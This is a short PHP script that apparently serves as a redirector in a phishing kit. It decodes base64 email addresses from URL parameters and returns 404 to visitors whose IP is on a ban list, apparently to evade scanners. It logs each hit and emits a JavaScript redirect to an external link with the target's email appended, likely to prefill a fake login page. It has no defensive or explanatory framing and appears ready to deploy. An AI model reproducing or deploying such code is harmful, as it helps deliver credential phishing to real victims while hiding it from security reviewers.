<?php

$link = "https://domain.com?email=";
$encoding = "0"; // 1 for base64

error_reporting(0);
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS");
header("Access-Control-Allow-Headers: x-test-header, Origin, X-Requested-With, Content-Type, Accept");

if ($_GET) {
    function getRealIPAddress()
    {
        if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
            $ip = $_SERVER['HTTP_CLIENT_IP'];
        } else if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
            $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
        } else {
            $ip = $_SERVER['REMOTE_ADDR'];
        }
        return $ip;
    }
    $ip = getRealIPAddress();
    $pattern = '/\b' . preg_quote($ip, '/') . '\b/';
    $content = file_get_contents('bans.txt');
    if (preg_match($pattern, $content, $matches)) {
        header("HTTP/1.0 404 Not Found");
        exit;
    } else {

        $save = fopen("hits.txt", "a");
        fwrite($save, $ip . " " . date("Y-m-d H:i:s") . "\n");
        fclose($save);
    }
    foreach ($_GET as $key => $value) {

        $email = base64_decode($value);

        if (filter_var($email, FILTER_VALIDATE_EMAIL)) {

            if ($encoding == "1") {
                $email = $value;
            }

            echo 'window.location.href = "' . $link . '' . $email . '"';
            break;
        } else {
            continue;
        }
    }
} else {

    echo "Access Denied!";
}
